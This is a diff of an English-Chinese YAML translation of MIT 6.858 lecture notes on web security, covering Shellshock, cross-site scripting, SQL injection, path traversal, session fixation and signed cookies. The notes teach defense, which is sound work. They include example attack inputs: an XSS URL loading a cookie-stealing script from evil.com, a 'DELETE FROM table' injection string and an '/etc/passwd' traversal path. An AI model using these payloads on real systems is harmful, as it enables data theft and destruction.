@@ -1,1104 +1,1525 @@
 - en: Web Security, part II
+  id: totrans-0
   prefs:
   - PREF_H1
   type: TYPE_NORMAL
+  zh: 网络安全，第二部分
 - en: '**Note:** These lecture notes were slightly modified from the ones posted on
     the 6.858 [course website](http://css.csail.mit.edu/6.858/2014/schedule.html)
     from 2014.'
+  id: totrans-1
   prefs: []
   type: TYPE_NORMAL
+  zh: '**注意：** 这些讲座笔记是从2014年6.858 [课程网站](http://css.csail.mit.edu/6.858/2014/schedule.html)上发布的笔记稍作修改而来。'
 - en: 'Last lecture, we looked at a core security mechanism for the web: the same-origin
     policy.'
+  id: totrans-2
   prefs: []
   type: TYPE_NORMAL
+  zh: 在上一讲中，我们看了一下网络的核心安全机制：同源策略。
 - en: In this lecture, we'll continue to look at how we can build secure web applications.
+  id: totrans-3
   prefs: []
   type: TYPE_NORMAL
+  zh: 在本讲座中，我们将继续探讨如何构建安全的网络应用程序。
 - en: '"Shell shock"-like exploits'
+  id: totrans-4
   prefs:
   - PREF_H2
   type: TYPE_NORMAL
+  zh: “Shell shock”类似的利用
 - en: The recent "Shell Shock" bug is a good example of *how **difficult** it is to
     design web services that compose multiple technologies*.
+  id: totrans-5
   prefs: []
   type: TYPE_NORMAL
+  zh: 最近的“Shell Shock”漏洞是一个很好的例子，说明*设计组合多种技术的网络服务是多么**困难***。
 - en: 'A web client can include extra headers in its HTTP requests, and determine
     which query parameters are in a request. Example:'
+  id: totrans-6
   prefs: []
   type: TYPE_NORMAL
+  zh: 网页客户端可以在其HTTP请求中包含额外的标头，并确定请求中的查询参数。例如：
 - en: '[PRE0]'
+  id: totrans-7
   prefs: []
   type: TYPE_PRE
+  zh: '[PRE0]'
 - en: CGI servers map the various components of the HTTP request to Unix environment
     variables.
+  id: totrans-8
   prefs: []
   type: TYPE_NORMAL
+  zh: CGI服务器将HTTP请求的各个组件映射到Unix环境变量。
 - en: '**Vulnerability:** Bash has a parsing bug in the way that it handles the setting
     of environment variables! If a string begins with a certain set of malformed bytes,
     bash will continue to parse the rest of the string and execute any commands that
     it finds! For example, if you set an environment variable to a value like this...'
+  id: totrans-9
   prefs: []
   type: TYPE_NORMAL
+  zh: '**漏洞：** Bash在处理环境变量设置时存在解析错误！如果一个字符串以一组特定的格式不正确的字节开头，bash将继续解析字符串的其余部分并执行找到的任何命令！例如，如果您将环境变量设置为这样的值...'
 - en: '[PRE1]'
+  id: totrans-10
   prefs: []
   type: TYPE_PRE
+  zh: '[PRE1]'
 - en: '...will confuse the bash parser, and cause it to execute the `/bin/id` command
     (which displays the UID and GID information for the current user).'
+  id: totrans-11
   prefs: []
   type: TYPE_NORMAL
+  zh: '...将混淆bash解析器，并导致执行`/bin/id`命令（显示当前用户的UID和GID信息）。'
 - en: 'Live demo:'
+  id: totrans-12
   prefs: []
   type: TYPE_NORMAL
+  zh: 实时演示：
 - en: '[PRE2]'
+  id: totrans-13
   prefs: []
   type: TYPE_PRE
+  zh: '[PRE2]'
 - en: 'More information: http://seclists.org/oss-sec/2014/q3/650'
+  id: totrans-14
   prefs: []
   type: TYPE_NORMAL
+  zh: 更多信息：http://seclists.org/oss-sec/2014/q3/650
 - en: Cross-site scripting (XSS) attacks
+  id: totrans-15
   prefs:
   - PREF_H2
   type: TYPE_NORMAL
+  zh: 跨站脚本攻击（XSS攻击）
 - en: Shell Shock is a particular instance of security bugs which arise from **improper
     content sanitzation.** Another type of content sanitzation failure occurs during
     cross-site scripting attacks (XSS).
+  id: totrans-16
   prefs: []
   type: TYPE_NORMAL
+  zh: Shell Shock是一种由**不当内容消毒**引起的安全漏洞的特定实例。另一种内容消毒失败发生在跨站脚本攻击（XSS）期间。
 - en: 'Example: Suppose that a CGI script embeds a query string parameter in the HTML
     that it generates.'
+  id: totrans-17
   prefs: []
   type: TYPE_NORMAL
+  zh: 例如：假设一个CGI脚本在生成的HTML中嵌入了一个查询字符串参数。
 - en: '**Demo:**'
+  id: totrans-18
   prefs: []
   type: TYPE_NORMAL
+  zh: '**演示：**'
 - en: '[PRE3]'
+  id: totrans-19
   prefs: []
   type: TYPE_PRE
+  zh: '[PRE3]'
 - en: Why is cross-site scripting so prevalent?
+  id: totrans-20
   prefs: []
   type: TYPE_NORMAL
+  zh: 为什么跨站脚本攻击如此普遍？
 - en: Dynamic web sites incorporate user content in HTML pages (e.g., comments sections).
+  id: totrans-21
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: 动态网站在HTML页面中包含用户内容（例如，评论部分）。
 - en: Web sites host uploaded user documents.
+  id: totrans-22
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: 网站托管上传的用户文档。
 - en: HTML documents can contain arbitrary Javascript code!
+  id: totrans-23
   prefs:
   - PREF_IND
   - PREF_UL
   type: TYPE_NORMAL
+  zh: HTML文档可以包含任意的Javascript代码！
 - en: Non-HTML documents may be content-sniffed as HTML by browsers.
+  id: totrans-24
   prefs:
   - PREF_IND
   - PREF_UL
   type: TYPE_NORMAL
+  zh: 非HTML文档可能被浏览器识别为HTML。
 - en: Insecure Javascript programs may directly execute code that comes from external
     parties (e.g., eval(), setTimeout(), etc.).
+  id: totrans-25
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: 不安全的Javascript程序可能直接执行来自外部方的代码（例如，eval()，setTimeout()等）。
 - en: XSS defenses
+  id: totrans-26
   prefs:
   - PREF_H2
   type: TYPE_NORMAL
+  zh: XSS防御
 - en: Chrome and IE have a built-in feature which uses **heuristics to detect potential
     cross-site scripting attacks.**
+  id: totrans-27
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: Chrome和IE具有内置功能，使用**启发式方法检测潜在的跨站脚本攻击**。
 - en: 'Ex: Is a script which is about to execute included in the request that fetched
     the enclosing page?'
+  id: totrans-28
   prefs:
   - PREF_IND
   - PREF_UL
   type: TYPE_NORMAL
+  zh: 例如：请求获取封闭页面的请求中是否包含即将执行的脚本？
 - en: '`http://foo.com?q=<script src="evil.com/cookieSteal.js"/>`'
+  id: totrans-29
   prefs:
   - PREF_IND
   - PREF_IND
   - PREF_UL
   type: TYPE_NORMAL
+  zh: '`http://foo.com?q=<script src="evil.com/cookieSteal.js"/>`'
 - en: If so, this is strong evidence that something suspicious is about to happen!
     The attack above is called a "reflected XSS attack," because the server "reflects"
     or "returns" the attacker-supplied code to the user's browser, executing it in
     the context of the victim page.
+  id: totrans-30
   prefs:
   - PREF_IND
   - PREF_UL
   type: TYPE_NORMAL
+  zh: 如果是这样，这是有力的证据表明即将发生可疑事件！上述攻击称为“反射型XSS攻击”，因为服务器“反射”或“返回”攻击者提供的代码到用户的浏览器中，在受害页面的上下文中执行。
 - en: This is why our first XSS attack in the CGI example didn't work--the browser
     detected reflected JavaScript in the URL, and removed the trailing `</script>`
     before it even reached the CGI server.
+  id: totrans-31
   prefs:
   - PREF_IND
   - PREF_IND
   - PREF_UL
   type: TYPE_NORMAL
+  zh: 这就是为什么我们在CGI示例中的第一个XSS攻击失败了--浏览器检测到URL中反射的JavaScript，并在到达CGI服务器之前删除了末尾的`</script>`。
 - en: However ...
+  id: totrans-32
   prefs:
   - PREF_IND
   - PREF_IND
   - PREF_UL
   type: TYPE_NORMAL
+  zh: 然而...
 - en: '*Filters don''t have 100% coverage*, because there are a huge number of ways
     to encode an XSS attack! [https://www.owasp.org/index.php/XSS*Filter*Evasion*Cheat*Sheet]'
+  id: totrans-33
   prefs:
   - PREF_IND
   - PREF_UL
   type: TYPE_NORMAL
+  zh: '*过滤器并不具有100%的覆盖率*，因为有许多编码XSS攻击的方式！[https://www.owasp.org/index.php/XSS*Filter*Evasion*Cheat*Sheet]'
 - en: This is why our second XSS attack succeeded---the browser got confused by our
     intentionally malformed HTML.
+  id: totrans-34
   prefs:
   - PREF_IND
   - PREF_IND
   - PREF_UL
   type: TYPE_NORMAL
+  zh: 这就是为什么我们的第二个 XSS 攻击成功了---浏览器被我们故意格式不正确的 HTML 搞糊涂了。
 - en: 'Problem: Filters can''t catch **persistent XSS attacks** in which the server
     saves attacker-provided data, which is then permanently distributed to clients.'
+  id: totrans-35
   prefs:
   - PREF_IND
   - PREF_UL
   type: TYPE_NORMAL
+  zh: 问题：过滤器无法捕获**持久性 XSS 攻击**，在这种攻击中，服务器保存了攻击者提供的数据，然后永久分发给客户端。
 - en: 'Classic example: A "comments" section which allows users to post HTML messages.'
+  id: totrans-36
   prefs:
   - PREF_IND
   - PREF_IND
   - PREF_UL
   type: TYPE_NORMAL
+  zh: 经典例子：一个允许用户发布 HTML 消息的 "评论" 部分。
 - en: 'Another example: Suppose that a dating site allows users to include HTML in
     their profiles. An attacker can add HTML that will run in a *different* user''s
     browser when that user looks at the attacker''s profile! Attacker could steal
     the user''s cookie.'
+  id: totrans-37
   prefs:
   - PREF_IND
   - PREF_IND
   - PREF_UL
   type: TYPE_NORMAL
+  zh: 另一个例子：假设一个约会网站允许用户在他们的个人资料中包含 HTML。攻击者可以添加 HTML，当用户查看攻击者的个人资料时，会在*不同*的用户浏览器中运行！攻击者可以窃取用户的
+    cookie。
 - en: 'Another XSS defense: **"httponly" cookies.**'
+  id: totrans-38
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: 另一个 XSS 防御：**"httponly" cookies.**
 - en: A server can tell a browser that client-side JavaScript should not be able to
     access a cookie. [The server does this by adding the "HttpOnly" token to a "Set-Cookie"
     HTTP response value.]
+  id: totrans-39
   prefs:
   - PREF_IND
   - PREF_UL
   type: TYPE_NORMAL
+  zh: 服务器可以告诉浏览器，客户端 JavaScript 不应该能够访问 cookie。[服务器通过在 "Set-Cookie" HTTP 响应值中添加 "HttpOnly"
+    令牌来实现这一点。]
 - en: This is only a partial defense, since the attacker can still issue requests
     that contain a user's cookies (CSRF).
+  id: totrans-40
   prefs:
   - PREF_IND
   - PREF_UL
   type: TYPE_NORMAL
+  zh: 这只是部分防御，因为攻击者仍然可以发出包含用户 cookie 的请求（CSRF）。
 - en: '**Privilege separation:** Use a separate domain for untrusted content.'
+  id: totrans-41
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: '**特权分离：** 使用一个单独的域来存放不受信任的内容。'
 - en: For example, Google stores untrusted content in `googleusercontent.com` (e.g.,
     cached copies of pages, Gmail attachments).
+  id: totrans-42
   prefs:
   - PREF_IND
   - PREF_UL
   type: TYPE_NORMAL
+  zh: 例如，Google 将不受信任的内容存储在 `googleusercontent.com` 中（例如，页面的缓存副本，Gmail 附件）。
 - en: Even if XSS is possible in the untrusted content, the attacker code will run
     in a different origin.
+  id: totrans-43
   prefs:
   - PREF_IND
   - PREF_UL
   type: TYPE_NORMAL
+  zh: 即使在不受信任的内容中可能存在 XSS，攻击者的代码也会在不同的来源中运行。
 - en: There may still be problems if the content in googleusercontent.com points to
     URLs in google.com.
+  id: totrans-44
   prefs:
   - PREF_IND
   - PREF_UL
   type: TYPE_NORMAL
+  zh: 如果 googleusercontent.com 中的内容指向 google.com 中的 URL，则仍可能存在问题。
 - en: '**Content sanitization:** Take untrusted content and encode it in a way that
     constrains how it can be interpreted.'
+  id: totrans-45
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: '**内容消毒：** 将不受信任的内容编码，以限制其解释方式。'
 - en: 'Ex: **Django templates:** Define an output page as a bunch of HTML that has
     some "holes" where external content can be inserted.'
+  id: totrans-46
   prefs:
   - PREF_IND
   - PREF_UL
   type: TYPE_NORMAL
+  zh: 例如：**Django 模板：** 将输出页面定义为一堆 HTML，其中有一些 "孔" 可以插入外部内容。
 - en: '[Automatic HTML escaping in Django](https://docs.djangoproject.com/en/dev/topics/templates/#automatic-html-escaping)'
+  id: totrans-47
   prefs:
   - PREF_IND
   - PREF_IND
   - PREF_UL
   type: TYPE_NORMAL
+  zh: '[Django 中的自动 HTML 转义](https://docs.djangoproject.com/en/dev/topics/templates/#automatic-html-escaping)'
 - en: A template might contain code like this ...
+  id: totrans-48
   prefs:
   - PREF_IND
   - PREF_UL
   type: TYPE_NORMAL
+  zh: 一个模板可能包含这样的代码...
 - en: '`<b>Hello {{ name }} </b>`'
+  id: totrans-49
   prefs:
   - PREF_IND
   - PREF_IND
   - PREF_UL
   type: TYPE_NORMAL
+  zh: '`<b>你好 {{ name }} </b>`'
 - en: '... where "name" is a variable that is resolved when the page is processed
     by the Django template engine. That engine will take the value of "name" (e.g.,
     from a user-supplied HTTP query string), and then automatically escape dangerous
     characters. For example,'
+  id: totrans-50
   prefs:
   - PREF_IND
   - PREF_UL
   type: TYPE_NORMAL
+  zh: '... 其中 "name" 是一个变量，在页面被 Django 模板引擎处理时被解析。该引擎将获取 "name" 的值（例如，从用户提供的 HTTP
+    查询字符串中），然后自动转义危险字符。例如，'
 - en: angle brackets `<` and `>` `--> &lt;` and `&gt;`
+  id: totrans-51
   prefs:
   - PREF_IND
   - PREF_IND
   - PREF_UL
   type: TYPE_NORMAL
+  zh: 尖括号 `<` 和 `>` `--> &lt;` 和 `&gt;`
 - en: double quotes `" --> &quot;`
+  id: totrans-52
   prefs:
   - PREF_IND
   - PREF_IND
   - PREF_UL
   type: TYPE_NORMAL
+  zh: 双引号 `" --> &quot;`
 - en: This prevents untrusted content from injecting HTML into the rendered page.
+  id: totrans-53
   prefs:
   - PREF_IND
   - PREF_UL
   type: TYPE_NORMAL
+  zh: 这可以防止不受信任的内容将 HTML 注入到渲染页面中。
 - en: Templates cannot defend against all attacks! For example . . .
+  id: totrans-54
   prefs:
   - PREF_IND
   - PREF_UL
   type: TYPE_NORMAL
+  zh: 模板不能防御所有攻击！例如...
 - en: '`<div class={{ var }}>...</div>`'
+  id: totrans-55
   prefs:
   - PREF_IND
   - PREF_IND
   - PREF_UL
   type: TYPE_NORMAL
+  zh: '`<div class={{ var }}>...</div>`'
 - en: if `var` equals `class1 onmouseover=javascript:func()`
+  id: totrans-56
   prefs:
   - PREF_IND
   - PREF_IND
   - PREF_UL
   type: TYPE_NORMAL
+  zh: 如果 `var` 等于 `class1 onmouseover=javascript:func()`
 - en: '...then there may be an XSS attack, depending on how the browser parses the
     malformed HTML.'
+  id: totrans-57
   prefs:
   - PREF_IND
   - PREF_IND
   - PREF_UL
   type: TYPE_NORMAL
+  zh: '... 那么根据浏览器解析格式不正确的 HTML 的方式，可能会发生 XSS 攻击。'
 - en: So, content sanitization kind-of works, but it's **extremely difficult to parse
     HTML in an unambigous way.**
+  id: totrans-58
   prefs:
   - PREF_IND
   - PREF_UL
   type: TYPE_NORMAL
+  zh: 因此，内容消毒有点奏效，但**解析 HTML 的方式非常难以明确。**
 - en: 'Possibly better approach: Completely disallow externally-provided HTML, and
     force external content to be expressed in a smaller language (e.g., [Markdown](http://daringfireball.net/projects/markdown/syntax)).'
+  id: totrans-59
   prefs:
   - PREF_IND
   - PREF_UL
   type: TYPE_NORMAL
+  zh: 可能更好的方法：完全禁止外部提供的 HTML，并强制外部内容用一种更小的语言表达（例如，[Markdown](http://daringfireball.net/projects/markdown/syntax)）。
 - en: Validated Markdown can then be translated into HTML.
+  id: totrans-60
   prefs:
   - PREF_IND
   - PREF_IND
   - PREF_UL
   type: TYPE_NORMAL
+  zh: 经过验证的 Markdown 可以被转换为 HTML。
 - en: '**Content Security Policy (CSP):** Allows a web server to tell the browser
     which kinds of resources can be loaded, and the allowable origins for those resources.'
+  id: totrans-61
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: '**内容安全策略（CSP）：** 允许 Web 服务器告诉浏览器可以加载哪种资源，以及这些资源的允许来源。'
 - en: Server specifies one or more headers of the type `Content-Security-Policy`.
+  id: totrans-62
   prefs:
   - PREF_IND
   - PREF_UL
   type: TYPE_NORMAL
+  zh: 服务器指定一个或多个类型为`Content-Security-Policy`的头部。
 - en: '[PRE4]'
+  id: totrans-63
   prefs:
   - PREF_IND
   - PREF_IND
   type: TYPE_PRE
+  zh: '[PRE4]'
 - en: You can specify separate policies for where images can come from, where scripts
     can come from, frames, plugins, etc.
+  id: totrans-64
   prefs:
   - PREF_IND
   - PREF_UL
   type: TYPE_NORMAL
+  zh: 您可以为图像来源、脚本来源、框架、插件等指定单独的策略。
 - en: CSP also prevents inline JavaScript, and JavaScript interfaces like `eval()`
     which allow for dynamic JavaScript generation.
+  id: totrans-65
   prefs:
   - PREF_IND
   - PREF_UL
   type: TYPE_NORMAL
+  zh: CSP还防止内联JavaScript，以及像`eval()`这样允许动态生成JavaScript的JavaScript接口。
 - en: 'Some browsers allow servers to disable content-type sniffing (`X-Content-Type-Options:
     nosniff`).'
+  id: totrans-66
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: '一些浏览器允许服务器禁用内容类型嗅探（`X-Content-Type-Options: nosniff`）。'
 - en: SQL injection attacks
+  id: totrans-67
   prefs:
   - PREF_H2
   type: TYPE_NORMAL
+  zh: SQL注入攻击
 - en: 'Suppose that the application needs to issue SQL query based on user input:'
+  id: totrans-68
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: 假设应用程序需要根据用户输入发出SQL查询：
 - en: '`query = "SELECT * FROM table WHERE userid=" + userid`'
+  id: totrans-69
   prefs:
   - PREF_IND
   - PREF_UL
   type: TYPE_NORMAL
+  zh: '`query = "SELECT * FROM table WHERE userid=" + userid`'
 - en: 'Problem: adversary can supply `userid` that changes SQL query structure, e.g.,'
+  id: totrans-70
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: 问题：对手可以提供改变SQL查询结构的`userid`，例如，
 - en: '`"0; DELETE FROM table;"`'
+  id: totrans-71
   prefs:
   - PREF_IND
   - PREF_UL
   type: TYPE_NORMAL
+  zh: '`"0; DELETE FROM table;"`'
 - en: What if we add quoting around userid?
+  id: totrans-72
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: 如果我们在userid周围添加引号会怎样？
 - en: '`query = "SELECT * FROM table WHERE userid=''" + userid + "''"`'
+  id: totrans-73
   prefs:
   - PREF_IND
   - PREF_UL
   type: TYPE_NORMAL
+  zh: '`query = "SELECT * FROM table WHERE userid=''" + userid + "''"`'
 - en: The vulnerability still exists! The attacker can just add another quote as first
     byte of `userid`.
+  id: totrans-74
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: 漏洞仍然存在！攻击者可以在`userid`的第一个字节前添加另一个引号。
 - en: '**Real solution:** unambiguously encode data.'
+  id: totrans-75
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: '**真正的解决方案：**明确地对数据进行编码。'
 - en: 'Ex: replace '' with \'', etc.'
+  id: totrans-76
   prefs:
   - PREF_IND
   - PREF_UL
   type: TYPE_NORMAL
+  zh: 例如：用\'替换'等。
 - en: SQL libraries provide escaping functions.
+  id: totrans-77
   prefs:
   - PREF_IND
   - PREF_UL
   type: TYPE_NORMAL
+  zh: SQL库提供转义函数。
 - en: Django defines a **query abstraction layer** which sits atop SQL and allows
     applications to avoid writing raw SQL (although they can do it if they really
     want to).
+  id: totrans-78
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: Django定义了一个**查询抽象层**，位于SQL之上，允许应用程序避免编写原始SQL（尽管如果他们真的想要，也可以这样做）。
 - en: (Possibly fake) German license plate which says ";DROP TABLE" to avoid speeding
     cameras which use OCR+SQL to extract license plate number.
+  id: totrans-79
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: （可能是假的）德国车牌上写着“;DROP TABLE”，以避免使用OCR+SQL的超速摄像头提取车牌号。
 - en: You can also run into problems if untrusted entities can supply filenames.
+  id: totrans-80
   prefs: []
   type: TYPE_NORMAL
+  zh: 如果不受信任的实体可以提供文件名，也会遇到问题。
 - en: 'Ex: Suppose that a web server reads files based on user-supplied parameters.'
+  id: totrans-81
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: 例如：假设一个Web服务器根据用户提供的参数读取文件。
 - en: '`open("/www/images/" + filename)` Problem: filename might look like this:'
+  id: totrans-82
   prefs:
   - PREF_IND
   - PREF_UL
   type: TYPE_NORMAL
+  zh: '`open("/www/images/" + filename)` 问题：文件名可能是这样的：'
 - en: '`../../../../../etc/passwd`'
+  id: totrans-83
   prefs:
   - PREF_IND
   - PREF_UL
   type: TYPE_NORMAL
+  zh: '`../../../../../etc/passwd`'
 - en: 'As with SQL injection, the server must sanitize the user input: the server
     must reject file names with slashes, or encode the slashes in some way.'
+  id: totrans-84
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: 与SQL注入一样，服务器必须对用户输入进行清理：服务器必须拒绝带有斜杠的文件名，或以某种方式对斜杠进行编码。
 - en: Django
+  id: totrans-85
   prefs:
   - PREF_H2
   type: TYPE_NORMAL
+  zh: Django
 - en: Moderately popular web framework, used by some large sites like Instagram, Mozilla,
     and Pinterest.
+  id: totrans-86
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: 颇受欢迎的Web框架，被一些大型网站如Instagram、Mozilla和Pinterest使用。
 - en: A "web framework" is a software system that provides infrastructure for tasks
     like database accesses, session management, and the creation of templated content
     that can be used throughout a site.
+  id: totrans-87
   prefs:
   - PREF_IND
   - PREF_UL
   type: TYPE_NORMAL
+  zh: “Web框架”是一个提供基础设施的软件系统，用于诸如数据库访问、会话管理和创建可在整个站点中使用的模板内容的任务。
 - en: 'Other frameworks are more popular: PHP, Ruby on Rails.'
+  id: totrans-88
   prefs:
   - PREF_IND
   - PREF_UL
   type: TYPE_NORMAL
+  zh: 其他框架更受欢迎：PHP、Ruby on Rails。
 - en: In the enterprise world, Java servlets and ASP are also widely used.
+  id: totrans-89
   prefs:
   - PREF_IND
   - PREF_UL
   type: TYPE_NORMAL
+  zh: 在企业世界中，Java servlets和ASP也被广泛使用。
 - en: Django developers have put some amount of thought into security.
+  id: totrans-90
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: Django开发人员在安全方面进行了一定程度的思考。
 - en: So, Django is a good case study to see how people implement web security in
     practice.
+  id: totrans-91
   prefs:
   - PREF_IND
   - PREF_UL
   type: TYPE_NORMAL
+  zh: 因此，Django是一个很好的案例研究，可以看到人们如何在实践中实现Web安全。
 - en: Django is probably better in terms of security than some of the alternatives
     like PHP or Ruby on Rails, but the devil is in the details.
+  id: totrans-92
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: Django在安全方面可能比一些替代方案如PHP或Ruby on Rails更好，但细节决定成败。
 - en: 'As we''ll discuss two lectures from now, researchers have invented some frameworks
     that offer provably better security. [Ur/Web: http://www.impredicative.com/ur/]'
+  id: totrans-93
   prefs:
   - PREF_IND
   - PREF_UL
   type: TYPE_NORMAL
+  zh: 正如我们将在两次讲座后讨论的那样，研究人员发明了一些提供明显更好安全性的框架。[Ur/Web：http://www.impredicative.com/ur/]
 - en: 'Session management: cookies'
+  id: totrans-94
   prefs:
   - PREF_H2
   type: TYPE_NORMAL
+  zh: 会话管理：cookie
 - en: '[Dos and Don''ts of Client Authentication on the Web](http://pdos.csail.mit.edu/papers/webauth:sec10.pdf)'
+  id: totrans-95
   prefs: []
   type: TYPE_NORMAL
+  zh: '[Web上客户端身份验证的Do''s和Don''ts](http://pdos.csail.mit.edu/papers/webauth:sec10.pdf)'
 - en: Zoobar, Django, and many web frameworks put a **random session ID** in the cookie.
+  id: totrans-96
   prefs: []
   type: TYPE_NORMAL
+  zh: Zoobar、Django和许多Web框架在cookie中放入一个**随机会话ID**。
 - en: The Session ID refers to an entry in some session table on the web server. The
     entry stores a bunch of per-user information.
+  id: totrans-97
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: 会话ID指的是Web服务器上某个会话表中的条目。该条目存储了一堆每个用户的信息。
 - en: 'Session cookies are *sensitive*: adversary can use them to impersonate a user!'
+  id: totrans-98
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: 会话cookie是*敏感的*：对手可以使用它们来冒充用户！
 - en: As we discussed last lecture, the same-origin policy helps to protect cookies
     ...
+  id: totrans-99
   prefs:
   - PREF_IND
   - PREF_UL
   type: TYPE_NORMAL
+  zh: 正如我们在上一堂课上讨论的，同源策略有助于保护 cookie……
 - en: '... but you **shouldn''t share a domain with sites that you don''t trust!**
     Otherwise, those sites can launch a **session fixation** attack:'
+  id: totrans-100
   prefs:
   - PREF_IND
   - PREF_UL
   type: TYPE_NORMAL
+  zh: …但是**不应该与您不信任的站点共享域！**否则，这些站点可能发起**会话固定**攻击：
 - en: Learn more on [Wikipedia, Session fixation](https://en.wikipedia.org/wiki/Session_fixation)
+  id: totrans-101
   prefs:
   - PREF_IND
   - PREF_IND
   - PREF_OL
   type: TYPE_NORMAL
+  zh: 在[Wikipedia, 会话固定](https://en.wikipedia.org/wiki/Session_fixation)上了解更多信息。
 - en: Attacker gets victim to visit a link or a website that sets the attacker specified
     session ID in the victim's cookie.
+  id: totrans-102
   prefs:
   - PREF_IND
   - PREF_IND
   - PREF_OL
   type: TYPE_NORMAL
+  zh: 攻击者让受害者访问一个链接或一个设置攻击者指定的会话 ID 在受害者 cookie 中的网站。
 - en: Attacker can exploit a server that accepts any session identifier from query
     strings and give the victim a URL like `lol.com/?PHPSID=abcd`
+  id: totrans-103
   prefs:
   - PREF_IND
   - PREF_IND
   - PREF_OL
   type: TYPE_NORMAL
+  zh: 攻击者可以利用接受来自查询字符串的任何会话标识符的服务器，并给受害者一个类似`lol.com/?PHPSID=abcd`的 URL。
 - en: The session ID can be chosen by the attacker or returned by the server when
     the attacker logs in.
+  id: totrans-104
   prefs:
   - PREF_IND
   - PREF_IND
   - PREF_IND
   - PREF_UL
   type: TYPE_NORMAL
+  zh: 会话 ID 可以由攻击者选择或在攻击者登录时由服务器返回。
 - en: Or, attacker can exploit a browser vulnerability that allows `a.example.com`
     to set a cookie for `b.example.com`. Attacker gets victim to visit his website
     `b.website.com`, which sets the cookie for the victim's `a.website.com`
+  id: totrans-105
   prefs:
   - PREF_IND
   - PREF_IND
   - PREF_OL
   type: TYPE_NORMAL
+  zh: 或者，攻击者可以利用浏览器漏洞，允许`a.example.com`为`b.example.com`设置 cookie。攻击者让受害者访问他的网站`b.website.com`，为受害者的`a.website.com`设置
+    cookie。
 - en: User navigates to the victim site; the attacker-choosen session ID is sent to
     the server and used to identify the user's session entry.
+  id: totrans-106
   prefs:
   - PREF_IND
   - PREF_IND
   - PREF_OL
   type: TYPE_NORMAL
+  zh: 用户导航到受害者网站；攻击者选择的会话 ID 被发送到服务器并用于识别用户的会话条目。
 - en: Later, the attacker can navigate to the victim site using the attacker-chosen
     session id, and access the user's state!
+  id: totrans-107
   prefs:
   - PREF_IND
   - PREF_IND
   - PREF_OL
   type: TYPE_NORMAL
+  zh: 后来，攻击者可以使用攻击者选择的会话 ID 导航到受害者网站，并访问用户的状态！
 - en: There's a **big if** here. This attack only works on clueless victims who do
     not notice that the account they are logged into is not theirs.
+  id: totrans-108
   prefs:
   - PREF_IND
   - PREF_IND
   - PREF_OL
   type: TYPE_NORMAL
+  zh: 这里有一个**很大的假设**。这种攻击只对没有注意到他们登录的账户不是自己的无知受害者有效。
 - en: Hmmm, but what if we don't want to have server-side state for every logged in
     user?
+  id: totrans-109
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: 嗯，但是如果我们不想为每个已登录用户保留服务器端状态怎么办？
 - en: Stateless cookies
+  id: totrans-110
   prefs:
   - PREF_H2
   type: TYPE_NORMAL
+  zh: 无状态 cookie
 - en: If you don't have the notion of a session, then you need to authenticate every
     request!
+  id: totrans-111
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: 如果您没有会话的概念，那么您需要对每个请求进行身份验证！
 - en: '**Idea:** Authenticate the cookie using cryptography.'
+  id: totrans-112
   prefs:
   - PREF_IND
   - PREF_UL
   type: TYPE_NORMAL
+  zh: '**想法：** 使用密码学验证 cookie。'
 - en: 'Primitive: Message authentication codes (MACs)'
+  id: totrans-113
   prefs:
   - PREF_IND
   - PREF_UL
   type: TYPE_NORMAL
+  zh: 原语：消息认证码（MACs）
 - en: 'Think of it like a keyed hash, e.g., `HMAC-SHA1: H(k, m)`'
+  id: totrans-114
   prefs:
   - PREF_IND
   - PREF_IND
   - PREF_UL
   type: TYPE_NORMAL
+  zh: '将其视为一个带有密钥的哈希，例如，`HMAC-SHA1: H(k, m)`'
 - en: Client and server share a key; client uses key to produce the message, and the
     server uses the key to verify the message.
+  id: totrans-115
   prefs:
   - PREF_IND
   - PREF_IND
   - PREF_UL
   type: TYPE_NORMAL
+  zh: 客户端和服务器共享一个密钥；客户端使用密钥生成消息，服务器使用密钥验证消息。
 - en: 'AWS S3 REST Services use this kind of cookie: [REST Authentication](http://docs.aws.amazon.com/AmazonS3/latest/dev/RESTAuthentication.html).'
+  id: totrans-116
   prefs:
   - PREF_IND
   - PREF_UL
   type: TYPE_NORMAL
+  zh: AWS S3 REST 服务使用这种类型的 cookie：[REST Authentication](http://docs.aws.amazon.com/AmazonS3/latest/dev/RESTAuthentication.html)。
 - en: 'Amazon gives each developer an AWS Access Key ID, and an AWS secret key. Each
     request looks like this:'
+  id: totrans-117
   prefs:
   - PREF_IND
   - PREF_IND
   - PREF_UL
   type: TYPE_NORMAL
+  zh: 亚马逊为每个开发者提供一个 AWS 访问密钥 ID 和一个 AWS 秘密密钥。每个请求看起来像这样：
 - en: '[PRE5]'
+  id: totrans-118
   prefs:
   - PREF_IND
   - PREF_IND
   - PREF_IND
   type: TYPE_PRE
+  zh: '[PRE5]'
 - en: 'Here''s what is signed (this is slightly simplified, see the link above for
     the full story):'
+  id: totrans-119
   prefs:
   - PREF_IND
   - PREF_IND
   - PREF_UL
   type: TYPE_NORMAL
+  zh: 这是签名的内容（这里稍微简化了，查看上面的链接获取完整故事）：
 - en: '[PRE6]'
+  id: totrans-120
   prefs:
